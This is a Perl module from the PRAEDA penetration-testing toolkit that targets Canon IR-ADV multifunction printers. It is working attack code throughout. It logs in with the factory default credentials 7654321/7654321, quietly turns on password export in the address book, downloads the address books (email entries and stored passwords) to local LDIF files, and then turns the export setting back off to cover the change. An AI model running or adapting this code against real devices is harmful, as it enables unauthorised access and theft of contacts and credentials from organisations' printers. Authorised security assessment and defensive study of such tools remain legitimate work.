# Canon IR-ADV MFP DEVICE
# email address books
######################################################
#                  PRAEDA Module #MP0021             #
#          Copyright (C) 2013 Foofus.net	     #
#             Deral "percX" Heiland                  #
######################################################
package MP0021;
sub MP0021
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Email Address Book Enumeration
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
print "\n**********Attempting to enumerate all Email Address books on Cannon IR-ADV $TARGET : JOB MP-TEST1**********\n";
print OUTFILE "\n**********Attempting to enumerate all Email Address books on Cannon IR-ADV $TARGET : JOB MP-TEST1**********\n";

my $browser = LWP::UserAgent->new(timeout => 15);

# Authenticate to device with default creds and setup cookie jar
my $jar = HTTP::Cookies->new();
$browser->cookie_jar($jar);
my $req= new HTTP::Request GET =>"http://$TARGET:8000/login?uri=%2F&deptid=7654321&password=7654321";
my $res = $browser->request($req);
$jar->extract_cookies($res);



# validate if default creds where successful or 
my $response = $browser->get("http$web://$TARGET:8000/rps/nativetop.cgi?RUIPNxBundle=&CorePGTAG=PGTAG_CONF_ENV_PAP&Dummy=1367629271762",);
my $content = $response->content();
if ($content =~ /VARIE_BOX_ALL_SETTING/)
   {
    print "$TARGET : SUCCESS : username=7654321 : password=7654321\n";
    print OUTFILE "$TARGET : SUCCESS : username=7654321 : password=7654321\n";



# Enable user password export in address books function
    $response = $browser->get("http$web://$TARGET:8000/rps/cadrs.cgi?ADRSEXPPSWDCHK=0&PageFlag=c_adrs.tpl&Flag=Exec_Data&CoreNXAction=.%2Fcadrs.cgi&CoreNXPage=c_adrexppass.tpl&CoreNXFlag=Init_Data&Dummy=1359048058115",);



# Export address books
    for ($count=1; $count<12; $count++)
	{
    	 $response = $browser->get("http$web://$TARGET:8000/rps/abook.ldif?AID=1&ACLS=1&ENC_MODE=0&ENC_FILE=password&PASSWD=&PageFlag=&AMOD=&Dummy=1359047882596&ERR_PG_KIND_FLG=Adress_Export",);
         if($response->content =~ m/error/ix)
            {
             print "\nPrinter returned an error";
             print OUTFILE "\nPrinter returned an error";
            }
	 elsif($response->content =~ /The certification has been updated or has expired/)
            {
             print "\n'DEBUG' User certification is invalid or date expired";
             print OUTFILE "\n'DEBUG' User certification is invalid or date expired";
	    } 
         else
            {
             open(JOBACCTOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-canon-address.ldif") || die("Failed to open  Output file $TARGET-$PORTS-canon-address.ldif \n");
             print JOBACCTOUTFILE $response->content;
            }
	}


# Disable user password export in address book function
my $response = $browser->get("http$web://$TARGET:8000/rps/cadrs.cgi?ADRSEXPPSWDCHK=1&PageFlag=c_adrs.tpl&Flag=Exec_Data&CoreNXAction=.%2Fcadrs.cgi&CoreNXPage=c_adrexppass.tpl&CoreNXFlag=Init_Data&Dummy=1359048058115",);

   }
        else
        {
           print "FAILED \n";
           print OUTFILE "FAILED \n";
        }


# operation completed close out output files
close(OUTFILE);
close (JOBACCTOUTFILE);
}

1;
